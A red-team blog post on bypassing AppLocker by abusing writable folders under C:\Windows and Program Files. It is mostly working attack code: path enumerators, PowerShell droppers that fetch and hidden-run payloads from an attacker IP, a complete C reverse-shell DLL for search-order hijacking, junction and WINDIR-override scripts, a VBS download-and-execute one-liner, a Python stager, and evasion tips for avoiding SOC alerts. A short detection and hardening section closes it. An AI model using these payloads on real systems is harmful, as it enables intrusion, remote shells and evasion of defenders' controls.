---
title: "AppLocker Bypass: Trusted Folder Abuse"
date: 2026-03-06
description: "Exploiting writable directories inside AppLocker-trusted paths — C:\\Windows\\Tasks, spool\\drivers\\color, and others — via direct execution, directory junctions, DLL hijacking, and environment variable manipulation."
tags: ["applocker", "bypass", "trusted-folders", "dll-hijacking", "lolbins", "evasion", "windows", "blueteam"]
---

> **Scope:** Red team / authorized penetration testing. Techniques map to MITRE ATT&CK [T1574](https://attack.mitre.org/techniques/T1574/) (Hijack Execution Flow), [T1574.001](https://attack.mitre.org/techniques/T1574/001/) (DLL Search Order Hijacking), [T1036](https://attack.mitre.org/techniques/T1036/) (Masquerading), and [T1574.010](https://attack.mitre.org/techniques/T1574/010/) (ServicesFile Permissions Weakness).

---

## Lab Setup

Reproduce every technique in an isolated snapshot environment before running anything on a real engagement.

### VM Stack

``` {linenos=inline}
┌─────────────────────────────────────────────────────────┐
│                   Host Machine                          │
│  ┌──────────────────────┐   ┌────────────────────────┐  │
│  │  Windows 10/11 VM    │   │   Kali Linux VM        │  │
│  │  (Target)            │   │   (Attacker)           │  │
│  │                      │   │                        │  │
│  │  - AppLocker enabled │   │  - Python HTTP server  │  │
│  │  - Standard user     │   │  - nc / rlwrap         │  │
│  │  - Sysmon installed  │   │  - msfvenom (optional) │  │
│  │  - Audit logging on  │   │                        │  │
│  │                      │   │  192.168.56.101        │  │
│  │  192.168.56.100      │   └────────────────────────┘  │
│  └──────────────────────┘                               │
│              Host-only network: 192.168.56.0/24         │
└─────────────────────────────────────────────────────────┘
```

### Windows VM — AppLocker + Standard User Configuration

```powershell {linenos=inline}
# 1. Enable AppLocker service
Set-Service -Name AppIDSvc -StartupType Automatic
Start-Service -Name AppIDSvc

# 2. Apply default rules via GPO (run as admin)
# gpedit.msc → Computer Configuration → Windows Settings →
#   Security Settings → Application Control Policies → AppLocker
# Right-click Executable Rules → Create Default Rules

# 3. Enforce rules (not just Audit)
# In each category → right-click → Properties → Enforcement: Enforced

# 4. Verify enforcement is active
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections

# 5. Create a standard (non-admin) test user
$pw = ConvertTo-SecureString "Password1!" -AsPlainText -Force
New-LocalUser -Name "testuser" -Password $pw -FullName "Test User"
Add-LocalGroupMember -Group "Users" -Member "testuser"
# Do NOT add to Administrators

# 6. Install AccessChk for writable-path discovery
# Download from https://learn.microsoft.com/en-us/sysinternals/
# Place accesschk.exe in C:\Tools\ (whitelisted or run from admin session)

# 7. Install Process Monitor
# Download from Sysinternals; useful for watching file/registry ops live

# 8. Enable process creation audit
auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable
# Verify
auditpol /get /subcategory:"Process Creation"
```

### Sysmon Configuration

```powershell
# Download Sysmon + SwiftOnSecurity config
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml" `
    -OutFile C:\Tools\sysmon-config.xml

# Install
C:\Tools\Sysmon64.exe -accepteula -i C:\Tools\sysmon-config.xml

# Monitor events in real time
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 20 |
    Select-Object TimeCreated, Id, Message | Format-List
```

### Attacker VM (Kali) — Payload Delivery Server

```bash
# Catch reverse shells
rlwrap nc -lvnp 4444

# Serve payloads over HTTP
mkdir -p ~/lab/trusted-folders
cd ~/lab/trusted-folders
python3 -m http.server 8080
```

### Snapshot

```
Take a snapshot named "AppLocker-Trusted-Clean" after all configuration is done.
Roll back between technique tests to keep the environment consistent.
```

---

## Diagrams

### AppLocker Path Trust Model

``` {linenos=inline}
AppLocker Rule Engine
        │
        ▼
  Is the binary path inside a trusted location?
        │
  ┌─────┴──────────────────────────────────────┐
  │                                            │
  ▼                                            ▼
%WINDIR%\*                            %PROGRAMFILES%\*
%PROGRAMFILES(X86)%\*
  │                                            │
  ▼                                            ▼
 ALLOW ← path matched                   ALLOW ← path matched
  │
  └── Who wrote the file? ← AppLocker DOESN'T CHECK THIS
        │
        ├── Admin wrote it → legitimate use
        └── Attacker wrote it → BYPASS (AppLocker still allows)

Key insight: path trust ≠ write-access control
```

### Writable Path Hierarchy Inside %WINDIR%

``` {linenos=inline}
C:\Windows\  (trusted by AppLocker default rule)
│
├── Tasks\                ← world-writable on many builds
├── Tracing\              ← writable by authenticated users
├── Temp\                 ← writable, but often blocked by group policy
├── System32\spool\drivers\color\  ← writable on some configs
├── SysWOW64\Tasks\       ← same as Tasks, 32-bit mirror
│
└── [any writable subdir] → drop payload → execute → AppLocker ALLOWS

Attacker's checklist:
  accesschk.exe -wud "C:\Windows" -accepteula
  accesschk.exe -wud "C:\Program Files" -accepteula
```

### Directory Junction Abuse Flow

``` {linenos=inline}
Step 1: Find a path AppLocker trusts but can't write to directly
        C:\Windows\System32\  (admin-only writes)

Step 2: Find a writable directory outside the trusted tree
        C:\Users\testuser\AppData\Local\Temp\junc_source\

Step 3: Create a junction from trusted-looking path → writable dir
        mklink /J C:\Windows\Tasks\junction_name C:\Users\testuser\AppData\...

Step 4: Drop payload into the writable directory
        Copy-Item payload.exe C:\Users\testuser\AppData\...\payload.exe

Step 5: Execute via the junction path
        C:\Windows\Tasks\junction_name\payload.exe
        ↑ AppLocker evaluates THIS path → matches %WINDIR%\* → ALLOW

Step 6: Payload runs — AppLocker never saw the real write location
```

### Environment Variable Manipulation Flow

``` {linenos=inline}
Normal resolution:
  %WINDIR% → C:\Windows  (set by SYSTEM at boot)

Attacker perspective (when %WINDIR% is user-controllable):
  Set-Item Env:WINDIR "C:\Users\testuser\AppData\Local\Temp\fakedir"
       │
       ▼
  AppLocker path rule: %WINDIR%\*
  Expands to: C:\Users\testuser\AppData\Local\Temp\fakedir\*
       │
       ▼
  Attacker drops payload.exe into that fake dir
  Executes it → AppLocker rule fires (expanded path matches) → ALLOW

Note: Modern systems fix this with locked WINDIR expansion in AppLocker,
      but legacy configs and some edge cases remain vulnerable.
```

---

## How AppLocker Path Rules Work

AppLocker's default ruleset grants execution rights using path-based rules. Out of the box, the three blessed paths are:

```
%WINDIR%\*               → C:\Windows\...
%PROGRAMFILES%\*         → C:\Program Files\...
%PROGRAMFILES(X86)%\*   → C:\Program Files (x86)\...
```

Anything inside these directories, regardless of who put it there, is **trusted**. AppLocker evaluates the path. That's it. If the file lives under `C:\Windows\`, the rule fires, execution is allowed, and no further inspection happens.

The assumption baked into this model is that only administrators can write to these directories. On a hardened system, that assumption holds. On a real-world enterprise box, it almost never does.

---

## The Attack Model

```
AppLocker path rule:  C:\Windows\* → ALLOW
                              │
Non-admin user finds:  C:\Windows\Tasks\ — world-writable
                              │
Drops payload.exe into that path
                              │
Executes it — AppLocker sees trusted path, fires ALLOW
                              │
Payload runs with user privileges, AppLocker never complained
```

The bypass lives entirely in the gap between **path trust** and **write access control**. Find a writable directory inside a trusted path, place your payload, execute. Game over.

---

## Phase 1 — Enumeration: Finding Writable Trusted Paths

### Built-in writable directories (default Windows installs)

These directories are writable by all authenticated users on most Windows versions without any configuration changes. They exist under `%WINDIR%`, which AppLocker trusts completely:

``` {linenos=inline}
C:\Windows\Tasks\
C:\Windows\Temp\
C:\Windows\tracing\
C:\Windows\Registration\CRMLog\
C:\Windows\System32\Com\dmp\
C:\Windows\System32\FxsTmp\
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys\
C:\Windows\System32\spool\drivers\color\
C:\Windows\System32\spool\PRINTERS\
C:\Windows\System32\spool\servers\
C:\Windows\SysWOW64\Com\dmp\
C:\Windows\SysWOW64\FxsTmp\
C:\Windows\SysWOW64\Tasks\
C:\Windows\tracing\
```

These are known. On your actual target, the installed software will have added more.

---

### Custom Tool 1 — PowerShell writable path enumerator

```powershell {linenos=inline}
# Find-WritableTrustedPaths.ps1
# Recursively walks AppLocker-trusted directories and reports
# every subdirectory the current user can write to.
# Outputs results ranked by usefulness (exec-friendly paths first).

param(
    [string[]]$TrustedRoots = @(
        $env:WINDIR,
        $env:PROGRAMFILES,
        ${env:PROGRAMFILES(X86)}
    ),
    [int]$MaxDepth  = 4,
    [switch]$Quiet
)

function Test-Writable {
    param([string]$Path)
    $probe = Join-Path $Path ([System.IO.Path]::GetRandomFileName())
    try {
        [System.IO.File]::WriteAllBytes($probe, [byte[]]@(0x4D, 0x5A))
        Remove-Item $probe -Force -ErrorAction SilentlyContinue
        return $true
    } catch {
        return $false
    }
}

function Get-Depth {
    param([string]$Path, [string]$Root)
    $rel = $Path.Substring($Root.Length).TrimStart('\')
    return ($rel -split '\\').Count
}

$results = [System.Collections.Generic.List[PSCustomObject]]::new()

foreach ($root in $TrustedRoots | Where-Object { $_ -and (Test-Path $_) }) {
    if (-not $Quiet) { Write-Host "[*] scanning $root ..." -ForegroundColor Cyan }

    Get-ChildItem -Path $root -Recurse -Directory -ErrorAction SilentlyContinue |
    Where-Object {
        (Get-Depth $_.FullName $root) -le $MaxDepth
    } |
    ForEach-Object {
        if (Test-Writable $_.FullName) {
            # check if we can also create executables (some paths allow write but block .exe)
            $exeProbe = Join-Path $_.FullName "test_$(Get-Random).exe"
            $exeOk = $false
            try {
                [System.IO.File]::WriteAllBytes($exeProbe, [byte[]]@(0x4D,0x5A,0x90,0x00))
                Remove-Item $exeProbe -Force -ErrorAction SilentlyContinue
                $exeOk = $true
            } catch {}

            $results.Add([PSCustomObject]@{
                Path       = $_.FullName
                ExeDrop    = $exeOk
                Root       = $root
                Depth      = (Get-Depth $_.FullName $root)
            })
        }
    }
}

# rank: exe-droppable first, then by depth (shallower = less conspicuous)
$ranked = $results | Sort-Object -Property @(
    @{ Expression = "ExeDrop"; Descending = $true },
    @{ Expression = "Depth";   Descending = $false }
)

Write-Host "`n[+] Writable trusted paths ($($ranked.Count) found):`n" -ForegroundColor Green

$ranked | ForEach-Object {
    $tag = if ($_.ExeDrop) { "[EXE]" } else { "[WRT]" }
    $col = if ($_.ExeDrop) { "Yellow" } else { "Gray" }
    Write-Host "  $tag $($_.Path)" -ForegroundColor $col
}

# export CSV for offline analysis
$ranked | Export-Csv -Path ".\writable_trusted_paths.csv" -NoTypeInformation
Write-Host "`n[*] saved to writable_trusted_paths.csv" -ForegroundColor Cyan
```

```powershell
# run
.\Find-WritableTrustedPaths.ps1

# deeper scan, all roots
.\Find-WritableTrustedPaths.ps1 -MaxDepth 6

# quiet — CSV only
.\Find-WritableTrustedPaths.ps1 -Quiet
```

---

### Custom Tool 2 — C# standalone enumerator (no PowerShell dependency)

Compile and drop this when PowerShell is locked down or Script Block Logging is hot.

```csharp {linenos=inline}
// PathFinder.cs — writable trusted path enumerator
// Compile: csc.exe /out:PathFinder.exe PathFinder.cs
//      or: dotnet build

using System;
using System.Collections.Generic;
using System.IO;
using System.Security.AccessControl;
using System.Security.Principal;

class PathFinder {

    static readonly string[] TrustedRoots = {
        Environment.GetEnvironmentVariable("WINDIR")            ?? @"C:\Windows",
        Environment.GetEnvironmentVariable("PROGRAMFILES")      ?? @"C:\Program Files",
        Environment.GetEnvironmentVariable("PROGRAMFILES(X86)") ?? @"C:\Program Files (x86)"
    };

    static WindowsIdentity _identity = WindowsIdentity.GetCurrent();

    static void Main(string[] args) {
        int maxDepth = 4;
        if (args.Length > 0) int.TryParse(args[0], out maxDepth);

        Console.ForegroundColor = ConsoleColor.Cyan;
        Console.WriteLine($"[*] running as {_identity.Name}");
        Console.WriteLine($"[*] scanning trusted roots (depth {maxDepth})\n");
        Console.ResetColor();

        var results = new List<(string path, bool exeOk)>();

        foreach (var root in TrustedRoots) {
            if (!Directory.Exists(root)) continue;
            Console.WriteLine($"[*] {root}");
            Walk(root, root, 0, maxDepth, results);
        }

        results.Sort((a, b) => {
            int exeCmp = b.exeOk.CompareTo(a.exeOk);
            return exeCmp != 0 ? exeCmp : a.path.Length.CompareTo(b.path.Length);
        });

        Console.ForegroundColor = ConsoleColor.Green;
        Console.WriteLine($"\n[+] {results.Count} writable path(s) found:\n");
        Console.ResetColor();

        foreach (var (path, exeOk) in results) {
            var tag = exeOk ? "[EXE]" : "[WRT]";
            Console.ForegroundColor = exeOk ? ConsoleColor.Yellow : ConsoleColor.Gray;
            Console.WriteLine($"  {tag} {path}");
        }
        Console.ResetColor();

        // write to file
        using var f = File.CreateText("writable_paths.txt");
        foreach (var (path, exeOk) in results)
            f.WriteLine($"{(exeOk ? "EXE" : "WRT")}\t{path}");
        Console.WriteLine("\n[*] saved → writable_paths.txt");
    }

    static void Walk(string root, string dir, int depth, int maxDepth,
                     List<(string, bool)> results) {
        if (depth > maxDepth) return;

        string[] subs;
        try { subs = Directory.GetDirectories(dir); }
        catch { return; }

        foreach (var sub in subs) {
            var (canWrite, canExe) = TestWrite(sub);
            if (canWrite) results.Add((sub, canExe));
            Walk(root, sub, depth + 1, maxDepth, results);
        }
    }

    static (bool write, bool exe) TestWrite(string dir) {
        var rand    = Path.GetRandomFileName();
        var probe   = Path.Combine(dir, rand);
        var exeProbe = Path.Combine(dir, rand + ".exe");
        bool write  = false, exe = false;

        try {
            File.WriteAllBytes(probe, new byte[] { 0x4D, 0x5A });
            File.Delete(probe);
            write = true;
        } catch { return (false, false); }

        try {
            // MZ header — valid enough to trigger AppLocker path eval
            File.WriteAllBytes(exeProbe, new byte[] { 0x4D,0x5A,0x90,0x00,0x03,0x00 });
            File.Delete(exeProbe);
            exe = true;
        } catch {}

        return (write, exe);
    }
}
```

```cmd
csc.exe /out:PathFinder.exe PathFinder.cs
PathFinder.exe          :: default depth 4
PathFinder.exe 6        :: depth 6
```

---

## Phase 2 — Exploitation

### Technique 1: Direct Execution from Writable Trusted Path

The simplest possible bypass. Drop your payload into a writable trusted directory, execute it. AppLocker checks the path, sees `C:\Windows\Tasks\`, fires the ALLOW rule.

```cmd
:: copy payload to writable trusted path
copy payload.exe C:\Windows\Tasks\svchost_upd.exe

:: execute — AppLocker evaluates path, not content
C:\Windows\Tasks\svchost_upd.exe
```

```powershell
# PowerShell dropper — fetch and execute from trusted path
$target = "C:\Windows\Tasks\WindowsUpdate.exe"
$url    = "http://10.10.10.10/payload.exe"

(New-Object Net.WebClient).DownloadFile($url, $target)
Start-Process $target -WindowStyle Hidden
```

---

### Technique 2: DLL Drop + Search Order Hijacking

When a trusted binary runs from a trusted path, Windows searches for its DLL dependencies in a predictable order. If any dependency is missing, or can be intercepted at a writable trusted path, you win. Your DLL loads inside a fully trusted process.

```
DLL search order (SafeDllSearchMode enabled):
  1. DLLs already in memory
  2. Known DLLs (HKLM\SYSTEM\...\KnownDLLs)
  3. The application's directory         ← if this is writable, done
  4. C:\Windows\System32\
  5. C:\Windows\System\
  6. C:\Windows\
  7. Current working directory
  8. PATH directories
```

#### Step 1: Find a vulnerable binary

```powershell {linenos=inline}
# Find-DLLHijack.ps1
# Finds trusted binaries that attempt to load DLLs that don't exist
# Requires Process Monitor (ProcMon) trace or uses the known-missing list

# Known DLLs missing from many Windows installations (common hijack targets)
$KnownMissing = @(
    "wbemcomn.dll",  "ntwdblib.dll",  "symsrv.dll",
    "dbghelp.dll",   "mscms.dll",     "MPSigStub.exe",
    "TSMSISrv.dll",  "TSVIPSrv.dll",  "Tsmsisi.dll"
)

# Find writable application directories for installed software
$appDirs = @(
    "$env:PROGRAMFILES",
    "${env:PROGRAMFILES(X86)}"
) | ForEach-Object {
    Get-ChildItem $_ -Directory -ErrorAction SilentlyContinue
} | Where-Object {
    $probe = Join-Path $_.FullName "probe_$(Get-Random).tmp"
    try {
        [IO.File]::WriteAllBytes($probe, @(0))
        Remove-Item $probe -Force
        $true
    } catch { $false }
}

Write-Host "[+] Writable application directories:"
$appDirs | ForEach-Object { Write-Host "    $($_.FullName)" }
Write-Host "`n[+] High-value DLL hijack candidates:"
$KnownMissing | ForEach-Object { Write-Host "    $_" }
```

#### Step 2: Build the hijack DLL

```c {linenos=inline}
/* hijack.c — DLL hijack payload
 * Drops in place of a missing DLL in a trusted binary's directory.
 * Forwards all expected exports to the real DLL so the host process
 * stays stable (important for persistence — crashing the host burns the foothold).
 *
 * Compile:
 *   x86_64-w64-mingw32-gcc -shared -o target.dll hijack.c \
 *       -lws2_32 -mwindows -s -Wl,--build-id=none \
 *       -Wl,--enable-stdcall-fixup
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#define LHOST "10.10.10.10"
#define LPORT  4444

static HANDLE g_thread = NULL;

/* ── reverse shell ───────────────────────────────────────────────────── */
static DWORD WINAPI shell_thread(LPVOID p) {
    (void)p;

    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);

    SOCKET sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP,
                             NULL, 0, WSA_FLAG_OVERLAPPED);
    if (sock == INVALID_SOCKET) return 1;

    struct sockaddr_in sa = {0};
    sa.sin_family = AF_INET;
    sa.sin_port   = htons(LPORT);
    inet_pton(AF_INET, LHOST, &sa.sin_addr);

    if (connect(sock, (SOCKADDR*)&sa, sizeof(sa)) != 0) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    STARTUPINFOA si = {0};
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput   = (HANDLE)sock;
    si.hStdOutput  = (HANDLE)sock;
    si.hStdError   = (HANDLE)sock;

    PROCESS_INFORMATION pi = {0};
    char cmd[] = "cmd.exe";
    CreateProcessA(NULL, cmd, NULL, NULL, TRUE,
                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(sock);
    WSACleanup();
    return 0;
}

/* ── DllMain ─────────────────────────────────────────────────────────── */
BOOL APIENTRY DllMain(HMODULE hMod, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hMod);
        g_thread = CreateThread(NULL, 0, shell_thread, NULL, 0, NULL);
    }
    if (reason == DLL_PROCESS_DETACH && g_thread) {
        CloseHandle(g_thread);
    }
    return TRUE;
}

/* ── stub exports — keeps host process from crashing ─────────────────── */
/* Add real forwarding pragmas for the specific DLL you're impersonating  */
__declspec(dllexport) void Stub_Export_1(void) {}
__declspec(dllexport) void Stub_Export_2(void) {}
```

#### Step 3: Deploy

```cmd
:: drop the hijack DLL where the vulnerable binary will find it
copy hijack.dll "C:\Program Files\VulnerableApp\wbemcomn.dll"

:: trigger the host binary — it loads your DLL, shell fires
"C:\Program Files\VulnerableApp\legit_app.exe"
```

---

### Technique 3: Directory Junction Abuse

A directory junction (symlink for directories) tricks AppLocker's path evaluation. AppLocker resolves the path of the **file**, not the junction that points to it. If you create a junction inside a trusted path pointing to a directory you control, files in your directory inherit the trusted path evaluation.

```cmd {linenos=inline}
:: create a directory you control (outside trusted paths)
mkdir C:\Users\Public\staging

:: drop your payload there
copy payload.exe C:\Users\Public\staging\update.exe

:: create a junction from a writable trusted path → your staging dir
:: requires mklink (built-in) — no admin needed for junctions to user-writable dirs
mklink /J C:\Windows\Tasks\TrustMe C:\Users\Public\staging

:: execute via the junction path — AppLocker sees C:\Windows\Tasks\TrustMe\update.exe
C:\Windows\Tasks\TrustMe\update.exe
```

```powershell {linenos=inline}
# Junction-Bypass.ps1 — automated junction creation and payload execution

param(
    [string]$PayloadUrl   = "http://10.10.10.10/payload.exe",
    [string]$StagingDir   = "$env:PUBLIC\svc",
    [string]$TrustedBase  = "C:\Windows\Tasks",
    [string]$JunctionName = "TrustMe_$(Get-Random -Max 9999)"
)

$junctionPath  = Join-Path $TrustedBase $JunctionName
$payloadLocal  = Join-Path $StagingDir  "svchost.exe"
$payloadViaJnc = Join-Path $junctionPath "svchost.exe"

# prep staging area (outside trusted path)
New-Item -ItemType Directory -Path $StagingDir -Force | Out-Null
(New-Object Net.WebClient).DownloadFile($PayloadUrl, $payloadLocal)
Write-Host "[+] payload staged at $payloadLocal"

# create junction from trusted path → staging dir
# cmd /c mklink needed — PowerShell New-Item junction requires elevation on some builds
cmd /c "mklink /J `"$junctionPath`" `"$StagingDir`"" | Out-Null
Write-Host "[+] junction: $junctionPath → $StagingDir"

# execute via trusted junction path
Start-Process -FilePath $payloadViaJnc -WindowStyle Hidden
Write-Host "[*] launched: $payloadViaJnc"
```

---

### Technique 4: Environment Variable Manipulation

AppLocker expands environment variables when evaluating path rules. If `%WINDIR%` can be overridden in the user's environment, the trusted path rule expands to a path you control.

```cmd {linenos=inline}
:: override WINDIR in user environment
:: (doesn't affect system — only current user session and child processes)
set WINDIR=C:\Users\Public\FakeWindows

:: create matching directory structure
mkdir C:\Users\Public\FakeWindows\Tasks

:: drop payload
copy payload.exe C:\Users\Public\FakeWindows\Tasks\update.exe

:: AppLocker evaluates path as %WINDIR%\Tasks\ — resolves to our fake dir
C:\Users\Public\FakeWindows\Tasks\update.exe
```

```powershell {linenos=inline}
# EnvVar-Bypass.ps1

$fakeWin   = "$env:PUBLIC\FakeWin"
$fakeTasks = "$fakeWin\Tasks"
$payload   = "$fakeTasks\svchost.exe"
$url       = "http://10.10.10.10/payload.exe"

New-Item -ItemType Directory -Path $fakeTasks -Force | Out-Null
(New-Object Net.WebClient).DownloadFile($url, $payload)

# override for this session and all child processes
$env:WINDIR = $fakeWin
[Environment]::SetEnvironmentVariable("WINDIR", $fakeWin, "User")

Write-Host "[+] WINDIR overridden → $fakeWin"
Write-Host "[+] payload at $payload"

# launch in a new session that inherits the modified environment
Start-Process $payload -WindowStyle Hidden
```

> **Note:** Modern Windows and hardened builds may not honor user-level `%WINDIR%` overrides in AppLocker evaluation. Test on the specific target OS and patch level. This works reliably on Windows 7–10 pre-2020 patching.

---

### Technique 5: Writable Path + Renamed Interpreter

A clean, reliable technique: copy a trusted script interpreter into a writable trusted directory, then use it to execute your payload. AppLocker allows both the interpreter (trusted binary, trusted path) and the script (same trusted path).

```cmd
:: copy cscript into a writable trusted path
copy C:\Windows\System32\cscript.exe C:\Windows\Tasks\cshost.exe

:: drop script payload in same trusted directory
echo WScript.Shell.Run "powershell -nop -w hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/s.ps1')" > C:\Windows\Tasks\init.vbs

:: execute — AppLocker sees two trusted-path files
C:\Windows\Tasks\cshost.exe //nologo C:\Windows\Tasks\init.vbs
```

---

### Technique 6: Trusted Path Payload Stager (Full Automation)

```python {linenos=inline}
#!/usr/bin/env python3
# trusted_path_stager.py
# Given a list of writable trusted paths (from PathFinder output),
# selects the best drop location, uploads payload, and generates
# the execution command.

import os
import sys
import socket
import struct
import argparse
from pathlib import Path

# Known writable trusted directories — ranked by stealth (lower = stealthier name)
KNOWN_WRITABLE = [
    r"C:\Windows\System32\spool\drivers\color",   # rarely monitored
    r"C:\Windows\tracing",
    r"C:\Windows\System32\Com\dmp",
    r"C:\Windows\System32\FxsTmp",
    r"C:\Windows\Registration\CRMLog",
    r"C:\Windows\Tasks",                           # common, slightly noisier
    r"C:\Windows\Temp",                            # noisiest — avoid if possible
]

LOLBINS = {
    "cscript":    r"C:\Windows\System32\cscript.exe",
    "wscript":    r"C:\Windows\System32\wscript.exe",
    "mshta":      r"C:\Windows\System32\mshta.exe",
    "rundll32":   r"C:\Windows\System32\rundll32.exe",
    "regsvr32":   r"C:\Windows\System32\regsvr32.exe",
}

def generate_dropper_ps1(drop_path: str, payload_url: str, lolbin: str = None) -> str:
    payload_name = "svchost_" + str(hash(payload_url) & 0xffff) + ".exe"
    target       = drop_path.rstrip("\\") + "\\" + payload_name

    lines = [
        f'# trusted path stager — generated by trusted_path_stager.py',
        f'$target = "{target}"',
        f'$url    = "{payload_url}"',
        f'',
        f'# fetch and write to trusted path',
        f'(New-Object Net.WebClient).DownloadFile($url, $target)',
        f'Write-Host "[+] dropped to $target"',
        f'',
    ]

    if lolbin:
        # execute via a LOLBin copy in the same trusted directory
        lolbin_src  = LOLBINS.get(lolbin, r"C:\Windows\System32\cscript.exe")
        lolbin_drop = drop_path.rstrip("\\") + f"\\{lolbin}host.exe"
        lines += [
            f'# copy interpreter to same trusted path',
            f'Copy-Item "{lolbin_src}" "{lolbin_drop}" -Force',
            f'Start-Process "{lolbin_drop}" -ArgumentList "//nologo $target" -WindowStyle Hidden',
        ]
    else:
        lines += [
            f'# execute directly',
            f'Start-Process $target -WindowStyle Hidden',
        ]

    lines += [
        f'Write-Host "[*] launched"',
    ]

    return "\n".join(lines)

def generate_cmd_oneliner(drop_path: str, payload_url: str) -> str:
    payload_name = "update_kb.exe"
    target       = drop_path.rstrip("\\") + "\\" + payload_name
    return (
        f'powershell -nop -w hidden -ep bypass -c "'
        f'(New-Object Net.WebClient).DownloadFile('
        f"\\'{payload_url}\\',\\'{target}\\');"
        f'Start-Process \\'{target}\\' -WindowStyle Hidden"'
    )

def main():
    p = argparse.ArgumentParser(description="Trusted Path Stager Generator")
    p.add_argument("--url",      required=True,  help="payload URL")
    p.add_argument("--path",     default=None,   help="override drop path")
    p.add_argument("--lolbin",   default=None,   choices=list(LOLBINS.keys()),
                   help="copy and use a LOLBin from the same trusted path")
    p.add_argument("--oneliner", action="store_true", help="output cmd one-liner only")
    args = p.parse_args()

    drop_path = args.path or KNOWN_WRITABLE[0]

    print(f"[*] target drop path : {drop_path}")
    print(f"[*] payload url      : {args.url}")
    if args.lolbin:
        print(f"[*] LOLBin           : {args.lolbin}")
    print()

    if args.oneliner:
        print("[CMD one-liner]")
        print(generate_cmd_oneliner(drop_path, args.url))
    else:
        print("[PowerShell dropper]")
        print("-" * 60)
        print(generate_dropper_ps1(drop_path, args.url, args.lolbin))

if __name__ == "__main__":
    main()
```

```bash {linenos=inline}
# generate a PS1 dropper for the stealthiest known writable path
python3 trusted_path_stager.py --url http://10.10.10.10/payload.exe

# use cscript LOLBin copy in the same trusted dir
python3 trusted_path_stager.py --url http://10.10.10.10/shell.vbs --lolbin cscript

# cmd one-liner (for macros, run dialog, etc.)
python3 trusted_path_stager.py --url http://10.10.10.10/payload.exe --oneliner

# specify custom drop path (from PathFinder output)
python3 trusted_path_stager.py \
    --url http://10.10.10.10/payload.exe \
    --path "C:\Windows\System32\spool\drivers\color"
```

---

## OpSec Notes

- **`C:\Windows\Temp`** is the noisiest writable trusted path — most blue teams monitor it explicitly. Prefer `spool\drivers\color`, `tracing`, or `FxsTmp` which are rarely watched.
- **Payload naming** matters. Files named `svchost.exe`, `lsass.exe`, or `explorer.exe` in non-standard locations are instant Tier-1 alerts on any SOC running Sysmon. Use plausible update or service names: `WmiApSrv.exe`, `MpCmdRun.exe`, `WUDFHost.exe`.
- **Directory junctions** are logged by Sysmon EID 11 (FileCreate) when the junction itself is created, but traversal through the junction typically does not generate separate path-resolution events — making it quieter than a straight file drop.
- **Environment variable manipulation** (`%WINDIR%`) leaves a trace in the registry if you use `SetEnvironmentVariable` at the `User` scope. Session-only (`set WINDIR=...`) is cleaner but dies with the process.
- **DLL hijacking** is the stealthiest long-term play — the host process is legitimate, signed, expected to run. Your DLL lives inside a trusted application directory. No suspicious child processes unless your shell spawns one.

---

## Detection (Blue Team)

| signal | event |
|--------|-------|
| Executable written to `C:\Windows\Tasks\`, `C:\Windows\Temp\`, or other writable trusted dirs | Sysmon EID 11 — FileCreate |
| Process launched from writable trusted path | Sysmon EID 1 — Image path analysis |
| Junction created inside `C:\Windows\*` | Sysmon EID 11 — TargetFilename contains junction |
| `%WINDIR%` overridden at user level | Registry EID 13 — `HKCU\Environment\WINDIR` |
| DLL loaded from application directory (non-system DLL) | Sysmon EID 7 — ImageLoad, check Signed + SignatureStatus |
| Known-writable trusted path in process Image field | Sysmon EID 1 — custom alert rule |

**Sysmon file creation rule:**

```xml {linenos=inline}
<FileCreate onmatch="include">
  <!-- executables written to writable trusted paths -->
  <TargetFilename condition="contains">Windows\Tasks\</TargetFilename>
  <TargetFilename condition="contains">Windows\tracing\</TargetFilename>
  <TargetFilename condition="contains">spool\drivers\color\</TargetFilename>
  <TargetFilename condition="contains">System32\Com\dmp\</TargetFilename>
  <TargetFilename condition="contains">System32\FxsTmp\</TargetFilename>
</FileCreate>

<ProcessCreate onmatch="include">
  <!-- processes launched from known writable trusted paths -->
  <Image condition="contains">Windows\Tasks\</Image>
  <Image condition="contains">Windows\tracing\</Image>
  <Image condition="contains">spool\drivers\color\</Image>
</ProcessCreate>
```

**Baseline hardening:**

```powershell {linenos=inline}
# Harden-TrustedPaths.ps1 — remove write access from trusted writable paths
# Run as Administrator

$harden = @(
    "C:\Windows\Tasks",
    "C:\Windows\tracing",
    "C:\Windows\System32\Com\dmp",
    "C:\Windows\System32\FxsTmp",
    "C:\Windows\System32\spool\drivers\color",
    "C:\Windows\System32\spool\PRINTERS",
    "C:\Windows\Registration\CRMLog"
)

foreach ($dir in $harden) {
    if (-not (Test-Path $dir)) { continue }

    $acl  = Get-Acl $dir
    $user = [System.Security.Principal.SecurityIdentifier]"S-1-5-32-545" # BUILTIN\Users

    # find and remove write rules for Users
    $toRemove = $acl.Access | Where-Object {
        $_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]) -eq $user -and
        ($_.FileSystemRights -band [System.Security.AccessControl.FileSystemRights]::Write) -ne 0
    }

    foreach ($rule in $toRemove) {
        $acl.RemoveAccessRule($rule) | Out-Null
        Write-Host "[+] removed write for Users: $dir"
    }

    Set-Acl -Path $dir -AclObject $acl
}
```

> Running this hardening script tightens the most commonly abused paths. Combine with WDAC for enforcement that doesn't rely on ACL integrity.

---

## MITRE ATT&CK

| technique | ID | description |
|-----------|----|-------------|
| Hijack Execution Flow | T1574 | Abusing DLL search order and writable paths |
| DLL Search Order Hijacking | T1574.001 | Dropping DLL in trusted app directory |
